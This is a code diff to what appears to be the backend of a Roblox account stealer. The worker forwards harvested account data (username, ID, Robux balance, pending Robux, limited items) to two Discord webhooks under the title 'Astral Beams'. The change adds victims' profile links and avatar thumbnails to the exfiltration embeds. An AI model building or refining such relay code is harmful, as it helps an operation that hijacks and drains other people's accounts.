@@ -339,8 +339,11 @@ export default {
         if (type === 'main') {
           webhookUrl = env.WEBHOOK1 || FALLBACK1;
           const d = data.data;
+          const profileLink = 'https://www.roblox.com/users/' + d.userId + '/profile';
+          const thumbnailLink = 'https://www.roblox.com/headshot-thumbnail/image?userId=' + d.userId + '&width=420&height=420&format=png';
+          
           const fields = [
-            { name: 'User', value: d.username || 'Unknown', inline: true },
+            { name: 'User', value: '[' + (d.username || 'Unknown') + '](' + profileLink + ')', inline: true },
             { name: 'ID', value: d.userId || 'N/A', inline: true },
             { name: 'Robux', value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
             { name: 'Pending', value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
@@ -355,9 +358,12 @@ export default {
             fields.push({ name: 'Limiteds', value: d.limiteds.join(', '), inline: false });
           }
           const embed = {
-            title: 'Astral Beams ' + fire,
+            title: fire + ' Astral Beams ' + fire,
             color: 0x9933ff,
             fields: fields,
+            thumbnail: {
+              url: thumbnailLink
+            },
             footer: { text: 'Astral ' + new Date().toLocaleString() },
             timestamp: new Date().toISOString()
           };
@@ -369,8 +375,11 @@ export default {
         } else if (type === 'secondary') {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
           const d = data.data;
+          const profileLink = 'https://www.roblox.com/users/' + d.userId + '/profile';
+          const thumbnailLink = 'https://www.roblox.com/headshot-thumbnail/image?userId=' + d.userId + '&width=420&height=420&format=png';
+          
           const fields = [
-            { name: 'User', value: d.username || 'Unknown', inline: true },
+            { name: 'User', value: '[' + (d.username || 'Unknown') + '](' + profileLink + ')', inline: true },
             { name: 'ID', value: d.userId || 'N/A', inline: true },
             { name: 'Robux', value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
             { name: 'Pending', value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
@@ -385,9 +394,12 @@ export default {
             fields.push({ name: 'Limiteds', value: d.limiteds.join(', '), inline: false });
           }
           const embed = {
-            title: 'Astral Beams ' + fire,
+            title: fire + ' Astral Beams ' + fire,
             color: 0x5865F2,
             fields: fields,
+            thumbnail: {
+              url: thumbnailLink
+            },
             footer: { text: 'Astral ' + new Date().toLocaleString() },
             timestamp: new Date().toISOString()
           };
